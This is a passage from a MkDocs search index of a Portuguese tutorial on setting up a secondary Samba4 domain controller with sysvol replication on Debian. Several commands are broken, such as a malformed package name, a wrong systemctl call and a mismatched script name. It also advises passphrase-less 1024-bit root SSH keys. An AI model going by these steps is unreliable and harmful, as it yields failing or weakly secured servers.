setexpiry Administrator --noexpiry\n</code></pre>"},{"location":"DC1_pacotes_compilados/#relendo-as-configuracoes-do-samba4","title":"Relendo as configura\u00e7\u00f5es do SAMBA4:","text":"<pre><code>smbcontrol all reload-config\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-a-troca-de-tickets-do-kerberos","title":"Validando a troca de tickets do Kerberos:","text":"<pre><code> kinit Administrator@OFFICINAS.EDU\n</code></pre> <pre><code>klist\u00a0\n</code></pre>"},{"location":"DC1_pacotes_compilados/#consultando-as-bases-do-kerberos-ldap-e-dns","title":"Consultando as bases do kerberos, ldap e dns:","text":"<pre><code>host -t srv _kerberos._tcp.officinas.edu\n</code></pre> <pre><code>host -t srv _ldap._tcp.officinas.edu\n</code></pre> <pre><code>host -t A dcmaster.officinas.edu.\n</code></pre> <pre><code>dig officinas.edu\n</code></pre> <p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"DC1_pacotes_compilados/#controlador-de-dominio-secundario-com-samba4-no-debian-linux-13","title":"Controlador de Dom\u00ednio secund\u00e1rio com Samba4 no Debian Linux 13","text":""},{"location":"DC1_pacotes_compilados/#layout-de-rede-usado-no-laboratorio_1","title":"Layout de rede usado no laborat\u00f3rio:","text":"<pre><code>firewall           192.168.70.254 (enp1s0) - 192.168.122.254 (enp7s0) (ssh 2277)\ndcmaster           192.168.70.250   (ssh 22250)\nmkdocs             192.168.70.222   (ssh 22222)\ndcslave            192.168.70.200   (ssh 22200)\nfileserver         192.168.70.150   (ssh 22100)\n\n; firewall         Roteamento por Iptables\n; dcmaster         Controlador de Dom\u00ednio prim\u00e1rio\n; mkdocs           Servidor de Documentos\n; dcslave          Controlador de Dom\u00ednio secund\u00e1rio\n; fileserver       Servidor de Arquivos\n</code></pre>"},{"location":"DC1_pacotes_compilados/#instalando-as-dependencias-para-compilacao-do-codigo-fonte-do-samba4_1","title":"Instalando as depend\u00eancias para compila\u00e7\u00e3o do c\u00f3digo fonte do Samba4:","text":"<pre><code>export DEBIAN_FRONTEND=noninteractive;apt-get update; apt-get install vim net-tools rsync acl apt-utils attr autoconf bind9-utils binutils bison build-essential ntp rsync ccache chrpath curl debhelper bind9-dnsutils docbook-xml docbook-xsl flex gcc gdb git glusterfs-common gzip heimdal-multidev hostname htop krb5-config krb5-user lcov libacl1-dev libarchive-dev libattr1-dev libavahi-common-dev libblkid-dev libbsd-dev libcap-dev libcephfs-dev libcups2-dev libdbus-1-dev libglib2.0-dev libgnutls28-dev libgpgme-dev libicu-dev libjansson-dev libjs-jquery libjson-perl libkrb5-dev libldap2-dev liblmdb-dev libncurses-dev libpam0g-dev libparse-yapp-perl libpcap-dev libpopt-dev libreadline-dev libsystemd-dev libtasn1-bin libtasn1--5-dev libunwind-dev lmdb-utils locales lsb-release make mawk mingw-w64 patch perl perl-modules-5.40 pkg-config procps psmisc python3 python3-cryptography python3-dbg python3-dev python3-dnspython python3-gpg python3-iso8601 python3-markdown python3-matplotlib python3-pexpect python3-pyasn1 rsync sed tar tree uuid-dev wget xfslibs-dev xsltproc zlib1g-dev -y\n</code></pre>"},{"location":"DC1_pacotes_compilados/#setando-e-validando-o-hostname-do-dcslave","title":"Setando e validando o hostname do dcslave:","text":"<pre><code>vim /etc/hostname\n</code></pre> <pre><code>dcslave\n</code></pre> <pre><code>hostname -f\n</code></pre> <pre><code>dcslave.officinas.edu\n</code></pre>"},{"location":"DC1_pacotes_compilados/#configurando-o-arquivo-de-hosts_1","title":"Configurando o arquivo de hosts:","text":"<pre><code>vim /etc/hosts\n</code></pre> <pre><code>.0.0.1              localhost\n127.0.1.1           dcslave.officinas.edu       dcslave\n192.168.70.150      fileserver.officinas.edu    fileserver\n192.168.70.200      dcslave.officinas.edu       dcslave\n192.168.70.222      mkdocs.officinas.edu        mkdocs\n192.168.70.250      dcmaster.officinas.edu      dcmaster\n192.168.70.254      firewall.officinas.edu      firewall\n</code></pre>"},{"location":"DC1_pacotes_compilados/#setando-ip-fixo-no-servidor-dcslave","title":"Setando ip fixo no servidor dcslave:","text":"<pre><code>vim /etc/network/interfaces\n</code></pre> <pre><code>allow-hotplug enp1s0\niface enp1s0 inet static\naddress           192.168.70.200\nnetmask           255.255.255.0\ngateway           192.168.70.254\n</code></pre>"},{"location":"DC1_pacotes_compilados/#apontando-o-endereco-do-resolvedor-de-nomes-principal-da-rede-pro-controlador-de-dominio-primario-dcmaster-temporario-ate-provisionar","title":"Apontando o endere\u00e7o do resolvedor de nomes principal da rede pro Controlador de dom\u00ednio prim\u00e1rio, dcmaster (tempor\u00e1rio, at\u00e9 provisionar):","text":"<pre><code>vim /etc/resolv.conf\n</code></pre> <pre><code>domain           officinas.edu\nsearch           officinas.edu.\nnameserver       192.168.70.250 #(dcmaster)\nnameserver       127.0.0.1\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-a-resolucao-de-nomes-pelo-dcmaster","title":"Validando a resolu\u00e7\u00e3o de nomes pelo dcmaster:","text":"<pre><code>nslookup officinas.edu\n</code></pre> <pre><code>Server:         192.168.70.250\nAddress:        192.168.70.250#53\n\nName:   officinas.edu\nAddress: 192.168.70.250\nName:   officinas.edu\nAddress: 192.168.70.200\n</code></pre>"},{"location":"DC1_pacotes_compilados/#relendo-as-configuracoes-de-rede","title":"Relendo as configura\u00e7\u00f5es de rede:","text":"<pre><code>systemctl restart networking\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-o-ip-da-placa_1","title":"Validando o ip da placa:","text":"<pre><code>ip -c addr\n</code></pre> <pre><code>ip -br link\n</code></pre>"},{"location":"DC1_pacotes_compilados/#baixando-e-compilando-o-codigo-fonte-do-samba4_1","title":"Baixando e compilando o c\u00f3digo fonte do Samba4:","text":"<pre><code>wget https://download.samba.org/pub/samba/samba-4.19.4.tar.gz\n</code></pre> <pre><code>tar -xvzf samba-4.19.4.tar.gz\n</code></pre> <pre><code>cd samba-4.19.4\n</code></pre> <pre><code>./configure --prefix=/opt/samba\n</code></pre> <pre><code>make &amp;&amp; make install\n</code></pre>"},{"location":"DC1_pacotes_compilados/#adicionando-optsamba-ao-path-padrao-do-linux-colando-a-linha-completa-ao-final-do-bashrc_1","title":"Adicionando /opt/Samba ao path padr\u00e3o do Linux, colando a linha completa ao final do .bashrc:","text":""},{"location":"DC1_pacotes_compilados/#pathusrlocalsbinusrlocalbinusrsbinusrbinsbinbinoptsambabinoptsambasbin_1","title":"PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/samba/bin:/opt/samba/sbin\"","text":"<pre><code>vim ~/.bashrc\n</code></pre> <pre><code>PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/samba/bin:/opt/samba/sbin\"\n</code></pre>"},{"location":"DC1_pacotes_compilados/#relendo-o-arquivo-de-profile_1","title":"Relendo o arquivo de profile:","text":"<pre><code>source ~/.bashrc\n</code></pre>"},{"location":"DC1_pacotes_compilados/#criando-o-daemon-de-inicializacao-do-samba4-com-o-sistema_1","title":"Criando o daemon de inicializa\u00e7\u00e3o do Samba4 com o sistema:","text":"<pre><code>vim /etc/systemd/system/samba-ad-dc.service\n</code></pre> <pre><code>[Unit]\n   Description=Samba4 Active Directory Slave Domain Controller\n   After=network.target remote-fs.target nss-lookup.target\n\n[Service]\n   Type=forking\n   ExecStart=/opt/samba/sbin/samba -D\n   PIDFile=/opt/samba/var/run/samba.pid\n\n[Install]\n   WantedBy=multi-user.target\n</code></pre> <pre><code>chmod +x /etc/systemd/system/samba-ad-dc.service\n</code></pre>"},{"location":"DC1_pacotes_compilados/#configurando-o-servico-de-sincronizacao-de-horario-apontando-pro-controlador-de-dominio-primario-dcmaster","title":"Configurando o servi\u00e7o de sincroniza\u00e7\u00e3o de hor\u00e1rio, apontando pro Controlador de dom\u00ednio prim\u00e1rio, dcmaster:","text":"<pre><code>mv /etc/ntpsec/ntp.conf{,.orig}\n</code></pre> <pre><code>vim /etc/ntpsec/ntp.conf\n</code></pre> <pre><code>driftfile /var/lib/ntpsec/ntp.drift\nleapfile /usr/share/zoneinfo/leap-seconds.list\ntos minclock 4 minsane 3\npool 192.168.70.250 iburst #(dcmaster)\nrestrict default kod nomodify nopeer noquery limited\nrestrict 127.0.0.1\nrestrict ::1\ntinker panic 0 #(Flag usada SOMENTE em VMs)\n</code></pre> <pre><code>systemctl restart ntp\n</code></pre> <pre><code>ntpq -p\n</code></pre> <pre><code>date\n</code></pre> <p>As m\u00e1quinas Windows/Linux, membros do dom\u00ednio, usar\u00e3o o DC1 que ret\u00e9m a fun\u00e7\u00e3o FSMO emulador PDC como fonte de tempo padr\u00e3o!</p>"},{"location":"DC1_pacotes_compilados/#provisionando-o-servidor-dcslave","title":"Provisionando o servidor DCSLAVE:","text":"<pre><code>samba-tool domain join OFFICINAS.EDU DC -U Administrator --realm=OFFICINAS.EDU --dns-backend=SAMBA_INTERNAL --option=\"interfaces=lo enp1s0\" --option=\"bind interfaces only=yes\" --option=\"idmap_ldb:use-rfc2307=yes\"\n</code></pre>"},{"location":"DC1_pacotes_compilados/#habilitando-o-daemon-pra-subir-no-boot-do-sistema_1","title":"Habilitando o daemon pra subir no boot do sistema:","text":"<pre><code>systemctl daemon reload\n</code></pre> <pre><code>systemctl enable samba-ad-dc.service\n</code></pre> <pre><code>systemctl start samba-ad-dc.service\n</code></pre> <pre><code>systemctl status samba-ad-dc.service\n</code></pre>"},{"location":"DC1_pacotes_compilados/#editando-o-arquivo-do-kerberos","title":"Editando o arquivo do kerberos:","text":"<pre><code>mv /etc/krb5.conf{,.orig}\n</code></pre> <pre><code>vim /etc/krb5.conf\n</code></pre> <pre><code>[libdefaults] #(sem espa\u00e7o no canto dessa linha)\n    dns_lookup_realm = false\n    dns_lookup_kdc = true\n    default_realm = OFFICINAS.EDU\n</code></pre>"},{"location":"DC1_pacotes_compilados/#visualizando-o-arquivo-smbconf","title":"Visualizando o arquivo smb.conf:","text":"<pre><code>cat /opt/samba/etc/smb.conf\n</code></pre> <pre><code># Global parameters\n[global]\n    bind interfaces only = Yes\n    interfaces = lo enp1s0\n    netbios name = DCSLAVE\n    realm = OFFICINAS.EDU\n    server role = active directory domain controller\n    workgroup = OFFICINAS\n    idmap_ldb:use-rfc2307 = yes\n\n[sysvol]\n    path = /opt/samba/var/locks/sysvol\n    read only = No\n\n[netlogon]\n    path = /opt/samba/var/locks/sysvol/officinas.edu/scripts\n    read only = No\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-as-entradas-dns-usadas","title":"Validando as entradas DNS usadas:","text":"<pre><code>apt install ldb-tools\n</code></pre> <pre><code>host -t A officinas.edu.\n</code></pre>"},{"location":"DC1_pacotes_compilados/#se-necessario-se-necessario-adicione-as-entradas-do-dcslave-manualmente-ao-dns-do-samba4-no-dcmaster","title":"(SE NECESS\u00c1RIO), SE Necess\u00e1rio, adicione as entradas do dcslave, manualmente AO DNS do Samba4, no dcmaster:","text":"<pre><code>samba-tool dns add dcmaster OFFICINAS.EDU dcslave A 192.168.70.200 -U administrator\n</code></pre> <pre><code>ldbsearch -H /opt/samba/private/sam.ldb '(invocationId=*)' --cross-ncs objectguid\n</code></pre> <pre><code>host -t CNAME df4bdd8c-abc7-4779-b01e-4dd4553ca3e9._msdcs.officinas.edu.\n</code></pre>"},{"location":"DC1_pacotes_compilados/#se-nao-rodar-execute-a-replicacao-para-todos-os-dcs","title":"SE n\u00e3o rodar, execute a replica\u00e7\u00e3o para todos os DCs:","text":"<pre><code>samba-tool dns add dcmaster _msdcs.officinas.edu df4bdd8c-abc7-4779-b01e-4dd4553ca3e9 CNAME dcslave.officinas.edu -Uadministrator\n</code></pre>"},{"location":"DC1_pacotes_compilados/#pasta-sysvol","title":"PASTA SYSVOL","text":""},{"location":"DC1_pacotes_compilados/#replicando-a-pasta-sysvol-mapeando-ids-de-grupos-e-usuarios-para-o-dcslave-execute-estes-comando-no-dcmaster","title":"Replicando a pasta sysvol. Mapeando IDs de grupos e usu\u00e1rios para o dcslave (execute estes comando NO DCMASTER):","text":"<pre><code>tdbbackup -s .bak /opt/samba/private/idmap.ldb\n</code></pre> <pre><code>scp -rv -p22200 /opt/samba/private/idmap.ldb.bak root@dcslave:/root\n</code></pre> <pre><code>scp -rv -p22200 /opt/samba/var/locks/sysvol/* root@dcslave:/opt/samba/var/locks/sysvol\n</code></pre>"},{"location":"DC1_pacotes_compilados/#aplicando-o-arquivo-bd-que-enviamos-do-dcmaster-execute-estes-comandos-no-dcslave","title":"Aplicando o arquivo BD que enviamos do dcmaster (execute estes comandos NO DCSLAVE):","text":"<pre><code>mv /root/idmap.ldb.bak /root/idmap.ldb\n</code></pre> <pre><code>cp -rfv /root/idmap.ldb /opt/samba/private/\n</code></pre> <pre><code>samba-tool ntacl sysvolreset\n</code></pre>"},{"location":"DC1_pacotes_compilados/#agora-precisamos-pensar-que-tendo-dois-dcs-na-rede-se-cair-o-primario-o-secundario-assume-o-controle-e-vice-versa-logicamente-devemos-apontar-um-pro-outro-como-resolvedor-de-nomes-primario-ou-seja-o-dcmaster-vai-resolver-primeiro-no-dcslave-e-o-dcslave-vai-resolver-primeiro-no-dcmaster","title":"Agora precisamos pensar que tendo dois DCs na rede, SE cair o prim\u00e1rio o secund\u00e1rio assume o controle, e vice versa. Logicamente devemos apontar um pro outro como resolvedor de nomes prim\u00e1rio, ou seja, o dcmaster vai resolver primeiro no dcslave e o dcslave vai resolver primeiro no dcmaster:","text":""},{"location":"DC1_pacotes_compilados/#edite-o-etcresolvconf-no-dcmaster-e-aponte-pro-dcslave","title":"Edite o /etc/resolv.conf NO DCMASTER e aponte pro dcslave:","text":"<pre><code>vim /etc/resolv.conf\n</code></pre> <pre><code>domain           officinas.edu\nsearch           officinas.edu.\nnameserver       192.168.70.200 #(dcslave)\nnameserver       127.0.0.1\n</code></pre>"},{"location":"DC1_pacotes_compilados/#bloqueando-a-edicao-do-arquivo-resolvconf","title":"Bloqueando a edi\u00e7\u00e3o do arquivo resolv.conf:","text":"<pre><code>chattr +i /etc/resolv.conf\n</code></pre>"},{"location":"DC1_pacotes_compilados/#e-no-reverso-edite-o-etcresolvconf-no-dcslave-apontando-pro-dcmaster","title":"E no reverso, edite o /etc/resolv.conf NO DCSLAVE apontando pro dcmaster:","text":""},{"location":"DC1_pacotes_compilados/#desbloqueando-a-edicao-do-arquivo-resolvconf","title":"Desbloqueando a edi\u00e7\u00e3o do arquivo resolv.conf:","text":"<pre><code>chattr -i /etc/resolv.conf\n</code></pre> <pre><code>vim /etc/resolv.conf\n</code></pre> <pre><code>domain           officinas.edu\nsearch           officinas.edu.\nnameserver       192.168.70.250 #(dcmaster)\nnameserver       127.0.0.1\n</code></pre>"},{"location":"DC1_pacotes_compilados/#bloqueando-a-edicao-do-arquivo-resolvconf_1","title":"Bloqueando a edi\u00e7\u00e3o do arquivo resolv.conf:","text":"<pre><code>chattr +i /etc/resolv.conf\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-a-replicacao-execute-em-todos-os-dcs","title":"Validando a replica\u00e7\u00e3o ( execute em todos os DCs):","text":"<pre><code>samba-tool drs showrepl\n</code></pre>"},{"location":"DC1_pacotes_compilados/#criando-um-usuario-no-dcmaster-execute-no-dcmaster","title":"Criando um usu\u00e1rio no dcmaster (execute NO DCMASTER):","text":"<pre><code>samba-tool user create userteste\n</code></pre> <pre><code>samba-tool user list\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-no-dcslave-se-consta-o-usuario-criado-no-dcmaster-execute-no-dcslave","title":"Validando no dcslave, se consta o usu\u00e1rio criado no dcmaster (execute NO DCSLAVE):","text":"<pre><code>samba-tool user list\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-o-compartilhamento-padrao","title":"Validando o compartilhamento padr\u00e3o:","text":"<pre><code>smbclient -L localhost -U%\n</code></pre> <pre><code>smbclient //localhost/netlogon -UAdministrator -c 'ls'\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-o-dns-local","title":"Validando o DNS local:","text":"<pre><code>host -t A officinas.edu localhost\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-a-troca-de-tickets-do-kerberos_1","title":"Validando a troca de tickets do kerberos:","text":"<pre><code>kinit Administrator\n</code></pre> <pre><code>klist\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-configuracao-de-kerberos-e-ldap","title":"Validando configura\u00e7\u00e3o de kerberos e ldap:","text":"<pre><code>host -t srv _kerberos._tcp.officinas.edu\n</code></pre> <pre><code>host -t srv _ldap._tcp.officinas.edu\n</code></pre> <pre><code>dig officinas.edu\n</code></pre> <pre><code>host -t A &lt;m\u00e1quina do dom\u00ednio&gt;\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-informacoes-de-servidor-qual-controla-o-pdc-emulator","title":"Validando informa\u00e7\u00f5es de servidor qual controla o PDC Emulator:","text":"<pre><code>samba-tool fsmo show | grep -i pdc\n</code></pre> <pre><code>samba-tool fsmo show\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-a-localizacao-do-diretorio-sysvol-do-dcmaster","title":"Validando a localiza\u00e7\u00e3o do diret\u00f3rio 'sysvol' do dcmaster:","text":"<pre><code>uname -ra\n</code></pre> <pre><code>find /opt/samba -iname sysvol\n</code></pre> <pre><code>     /opt/samba/var/locks/sysvol\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-espaco-disponivel","title":"Validando espa\u00e7o dispon\u00edvel:","text":"<pre><code>df -h\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-a-uuid-do-seu-disco","title":"Validando a UUID do seu disco:","text":"<pre><code>blkid /dev/sda2 #(Sete A SUA parti\u00e7\u00e3o de disco)\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-suporte-ativo-no-kernel-as-flags-de-acl-e-seguranca","title":"Validando suporte ativo no Kernel \u00e1s flags de acl e seguran\u00e7a:","text":"<pre><code>cat /boot/config-6.1.0-17-amd64 | grep _ACL\n</code></pre> <pre><code>cat /boot/config-6.1.0-17-amd64 | grep FS_SECURITY\n</code></pre>"},{"location":"DC1_pacotes_compilados/#gerando-e-enviando-as-chaves-do-ssh-para-sincronizacao-entre-o-dcmaster-e-o-dcslave-crie-as-chaves-no-dcmaster-e-envie-a-chave-publica-para-o-dcslave","title":"Gerando e enviando as chaves do ssh para sincroniza\u00e7\u00e3o entre o dcmaster e o dcslave (crie as chaves NO DCMASTER e envie a chave p\u00fablica para o dcslave):","text":""},{"location":"DC1_pacotes_compilados/#pode-deixar-a-senha-em-branco-se-preferir","title":"(Pode deixar a senha em branco SE preferir)","text":"<pre><code>ssh-keygen -t rsa -b 1024\n</code></pre> <pre><code>ssh-copy-id -p22200 -i ~/.ssh/id_rsa.pub root@dcslave #(O MEU dcslave usa a porta ssh 22200)\n</code></pre>"},{"location":"DC1_pacotes_compilados/#testando-a-conexao-por-ssh-sem-pedir-senha-se-vc-deixou-em-branco","title":"Testando a conex\u00e3o por ssh sem pedir senha (SE vc deixou em branco):","text":"<pre><code>ssh -p22200 dcslave\n</code></pre> <pre><code>exit\n</code></pre>"},{"location":"DC1_pacotes_compilados/#agora-inverta-a-ordem-e-crie-as-chaves-no-dcslave-e-envie-para-o-dcmaster-rode-estes-comandos-no-dcslave","title":"Agora inverta a ordem e crie as chaves NO DCSLAVE e envie para o dcmaster (Rode estes comandos NO DCSLAVE):","text":"<pre><code>ssh-keygen -t rsa -b 1024\n</code></pre> <pre><code>ssh-copy-id -p22250 -i ~/.ssh/id_rsa.pub root@dcmaster #(enviando para o dcmaster, que usa porta ssh 22250)\n</code></pre>"},{"location":"DC1_pacotes_compilados/#testando-a-conexao-por-ssh-sem-pedir-senha-se-vc-deixou-em-branco_1","title":"Testando a conex\u00e3o por ssh sem pedir senha (SE vc deixou em branco):","text":"<pre><code>ssh -p22250 dcmaster\n</code></pre> <pre><code>exit\n</code></pre>"},{"location":"DC1_pacotes_compilados/#criando-script-de-sincronizacao-com-rsync-do-diretorio-sysvol-do-dcmaster-para-envio-ao-dcslave-rode-estes-comando-no-dcmaster","title":"Criando script de sincroniza\u00e7\u00e3o com rsync do diret\u00f3rio 'sysvol' DO DCMASTER para envio ao dcslave (rode estes comando NO DCMASTER):","text":"<pre><code>cd /opt\n</code></pre> <pre><code>vim rsync-sysvol.sh\n</code></pre> <pre><code>#!/bin/bash\n# Sincronizando Diretorios do Sysvol do dcmaster para envio ao dcslave:\n#rsync -Cravz /opt/samba/var/locks/sysvol/*  root@192.168.70.200:/opt/samba/var/locks/sysvol/\n# no MEU CASO onde a porta do ssh n\u00e3o \u00e1 a default. MEU dcslave usa 22200:\nrsync -Cravz -e \"ssh -p 22200\" /opt/samba/var/locks/sysvol/*  root@192.168.70.200:/opt/samba/var/locks/sysvol/\n</code></pre> <pre><code>chmod +x rsync-sysvol\n</code></pre> <pre><code>./rsync-sysvol\n</code></pre>"},{"location":"DC1_pacotes_compilados/#agendando-a-sincronizacao-no-cron-do-dcmaster","title":"Agendando a sincroniza\u00e7\u00e3o no cron do dcmaster:","text":"<pre><code>crontab -e\n</code></pre> <pre><code>*/5 * * * * root  bash /opt/rsync-sysvol.sh --silent\n</code></pre>"},{"location":"DC1_pacotes_compilados/#repita-o-processo-de-replicacao-do-sysvol-agora-no-dcslave-invertendo-os-apontamentos-de-ip-obviamente","title":"REPITA o processo de replica\u00e7\u00e3o do sysvol, agora NO DCSLAVE, INVERTENDO os apontamentos de ip, obviamente!","text":""},{"location":"DC1_pacotes_compilados/#criando-script-de-sincronizacao-do-diretorio-sysvol-do-dcslave-para-envio-ao-dcmaster-rode-os-comando-agora-no-dcslave","title":"Criando script de sincroniza\u00e7\u00e3o do diret\u00f3rio 'sysvol' DO DCSLAVE para envio ao dcmaster (rode os comando agora NO DCSLAVE):","text":"<pre><code>cd /opt\n</code></pre> <pre><code>vim rsync-sysvol.sh\n</code></pre> <pre><code>#!/bin/bash\n# Sincronizando Diretorios do Sysvol do dcmaster para envio ao dcslave:\n#rsync -Cravz /opt/samba/var/locks/sysvol/*  root@192.168.70.250:/opt/samba/var/locks/sysvol/\n# no MEU CASO onde a porta do ssh n\u00e3o \u00e1 a default. MEU dcmaster usa 22250:\nrsync -Cravz -e \"ssh -p 22250\" /opt/samba/var/locks/sysvol/*  root@192.168.70.250:/opt/samba/var/locks/sysvol/\n</code></pre> <pre><code>chmod +x rsync-sysvol\n</code></pre> <pre><code>./rsync-sysvol\n</code></pre>"},{"location":"DC1_pacotes_compilados/#agendando-a-sincronizacao-no-cron-do-dcslave","title":"Agendando a sincroniza\u00e7\u00e3o no cron do dcslave:","text":"<pre><code>crontab -e\n</code></pre> <pre><code>*/5 * * * * root  bash /opt/rsync-sysvol.sh --silent\n</code></pre>"},{"location":"DC1_pacotes_compilados/#as-estacoes-de-trabalho-usarao-como-dns-primario-o-pdc-emulator-do-dominio-e-como-dns-secundario-o-pdc-secundario-da-rede","title":"As Esta\u00e7\u00f5es de trabalho, usar\u00e3o, como DNS prim\u00e1rio o PDC Emulator do Dom\u00ednio, e como DNS secund\u00e1rio o PDC Secund\u00e1rio da rede.","text":""},{"location":"DC1_pacotes_compilados/#osync","title":"OSYNC","text":""},{"location":"DC1_pacotes_compilados/#configurando-a-sincronizacao-da-pasta-sysvol-com-osync-que-vai-espelhar-os-dcs-rode-esses-comandos-no-dcmaster-primeiro","title":"Configurando a sincroniza\u00e7\u00e3o da pasta sysvol com osync, que vai espelhar os DCs (rode esses comandos NO DCMASTER, primeiro):","text":"<pre><code>cd /opt\n</code></pre> <pre><code>git clone https://github.com/deajan/osync.git\n</code></pre> <pre><code>cd osync\n</code></pre> <pre><code>sh ./install.sh\n</code></pre>"},{"location":"DC1_pacotes_compilados/#vai-criar-o-diretorio-etcosync","title":"Vai criar o diret\u00f3rio /etc/osync:","text":""},{"location":"DC1_pacotes_compilados/#dentro-dele-vai-ter-o-arquivo-de-configuracao-syncconfexample-crie-um-arquivo-syncconf-e-cole-o-conteudo-abaixo","title":"Dentro dele vai ter o arquivo de configura\u00e7\u00e3o sync.conf.example. Crie um arquivo sync.conf e cole o conte\u00fado abaixo:","text":"<pre><code>vim /etc/osync/sync.conf\n</code></pre> <pre><code>#!/usr/bin/env bash\n\nINSTANCE_ID=\"sysvol_sync\"\n\nINITIATOR_SYNC_DIR=\"/opt/samba/var/locks/sysvol\"\n\nTARGET_SYNC_DIR=\"ssh://root@192.168.70.200:22200//opt/samba/var/locks/sysvol\"\n\nSSH_RSA_PRIVATE_KEY=\"/root/.ssh/id_rsa\"\n\nREMOTE_3RD_PARTY_HOSTS=\"\"\n\nPRESERVE_ACL=yes\n\nPRESERVE_XATTR=yes\n\nSOFT_DELETE=yes\n\nDESTINATION_MAILS=\"roor@localhost\"\n\n#REMOTE_RUN_AFTER_CMD=\"/opt/samba/bin/samba-tool ntacl sysvolreset\"\n</code></pre>"},{"location":"DC1_pacotes_compilados/#rodando-o-script-de-atualizacao-que-esta-dentro-do-optosync-apontando-pro-arquivo-etcosyncsyncconf","title":"rodando o script de atualiza\u00e7\u00e3o, que est\u00e1 dentro do /opt/osync, apontando pro arquivo /etc/osync/sync.conf:","text":"<pre><code>./upgrade-v1.0x-v1.2x.sh /etc/osync/sync.conf\n</code></pre>"},{"location":"DC1_pacotes_compilados/#vai-ficar-semelhante-ao-modelo-abaixo","title":"Vai ficar semelhante ao modelo abaixo:","text":"<pre><code>#!/usr/bin/env bash\n\nINSTANCE_ID=\"sysvol_sync\"\n\nINITIATOR_SYNC_DIR=\"/opt/samba/var/locks/sysvol\"\n\nTARGET_SYNC_DIR=\"ssh://root@192.168.70.200:22200//opt/samba/var/locks/sysvol\"\n\nSSH_RSA_PRIVATE_KEY=\"/root/.ssh/id_rsa\"\n\nSSH_PASSWORD_FILE=\"\"\n\n_REMOTE_TOKEN=\"SomeAlphaNumericToken9\"\n\nCREATE_DIRS=false\n\nLOGFILE=\"\"\n\nMINIMUM_SPACE=\"10240\"\n\nBANDWIDTH=\"0\"\n\nSUDO_EXEC=false\n\nRSYNC_EXECUTABLE=\"rsync\"\n\nRSYNC_REMOTE_PATH=\"\"\n\nRSYNC_PATTERN_FIRST=\"include\"\n\nRSYNC_INCLUDE_PATTERN=\"\"\n\nRSYNC_EXCLUDE_PATTERN=\"\"\n\nRSYNC_INCLUDE_FROM=\"\"\n\nRSYNC_EXCLUDE_FROM=\"\"\n\nPATH_SEPARATOR_CHAR=\";\"\n\nSSH_COMPRESSION=true\n\nSSH_IGNORE_KNOWN_HOSTS=false\n\nSSH_CONTROLMASTER=false\n\nREMOTE_HOST_PING=false\n</code></pre>"},{"location":"DC1_pacotes_compilados/#testando-o-sincronizmo-ignore-o-erro-de-email","title":"Testando o sincronizmo (ignore o erro de email):","text":"<pre><code>/usr/local/bin/osync.sh /etc/osync/sync.conf --dry --verbose\n</code></pre>"},{"location":"DC1_pacotes_compilados/#rodar-o-sincronizmo-de-fato","title":"Rodar o sincronizmo de fato:","text":"<pre><code>/usr/local/bin/osync.sh /etc/osync/sync.conf --verbose\n</code></pre>"},{"location":"DC1_pacotes_compilados/#agendar-no-cron","title":"Agendar no cron:","text":"<pre><code>crontab -e\n</code></pre> <pre><code>*/5 * * * * root  bash /usr/local/bin/osync.sh /etc/osync/sync.conf --silent\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-os-logs-em-tempo-real-rode-o-usrlocalbinosyncsh-mantendo-outro-terminal-aberto-com-o-comando","title":"Validando os logs em tempo real, rode o /usr/local/bin/osync.sh, mantendo outro terminal aberto com o comando:","text":"<pre><code>tail -f /var/log/osync.sysvol_sync.log\n</code></pre>"},{"location":"DC1_pacotes_compilados/#invertendo-a-sincronizacao-com-o-osync-vamos-refazer-tudo-incluindo-o-ip-e-porta-ssh-agora-no-dcslave","title":"INVERTENDO a sincroniza\u00e7\u00e3o com o Osync, vamos refazer tudo, inclu\u00edndo o ip e porta ssh, agora NO DCSLAVE:","text":"<pre><code>cd /opt\n</code></pre> <pre><code>git clone https://github.com/deajan/osync.git\n</code></pre> <pre><code>cd osync\n</code></pre> <pre><code>sh ./install.sh\n</code></pre>"},{"location":"DC1_pacotes_compilados/#vai-criar-o-diretorio-etcosync_1","title":"Vai criar o diret\u00f3rio /etc/osync:","text":""},{"location":"DC1_pacotes_compilados/#dentro-dele-vai-ter-o-arquivo-de-configuracao-syncconfexample-crie-um-arquivo-syncconf-e-cole-o-conteudo-abaixo_1","title":"Dentro dele vai ter o arquivo de configura\u00e7\u00e3o sync.conf.example. Crie um arquivo sync.conf e cole o conte\u00fado abaixo:","text":"<pre><code>#!/usr/bin/env bash\n\nINSTANCE_ID=\"sysvol_sync\"\n\nINITIATOR_SYNC_DIR=\"/opt/samba/var/locks/sysvol\"\n\nTARGET_SYNC_DIR=\"ssh://root@192.168.70.250:22250//opt/samba/var/locks/sysvol\"\n\nSSH_RSA_PRIVATE_KEY=\"/root/.ssh/id_rsa\"\n\nREMOTE_3RD_PARTY_HOSTS=\"\"\n\nPRESERVE_ACL=yes\n\nPRESERVE_XATTR=yes\n\nSOFT_DELETE=yes\n\nDESTINATION_MAILS=\"roor@localhost\"\n\n#REMOTE_RUN_AFTER_CMD=\"/opt/samba/bin/samba-tool ntacl sysvolreset\"\n</code></pre>"},{"location":"DC1_pacotes_compilados/#vai-precisa-configurar-seu-ip-e-o-path-pra-rodar-o-script-de-atualizacao-apontando-pro-arquivo-syncconf","title":"Vai precisa configurar seu ip e o path pra rodar o script de atualiza\u00e7\u00e3o, apontando pro arquivo sync.conf:","text":"<pre><code>./upgrade-v1.0x-v1.2x.sh 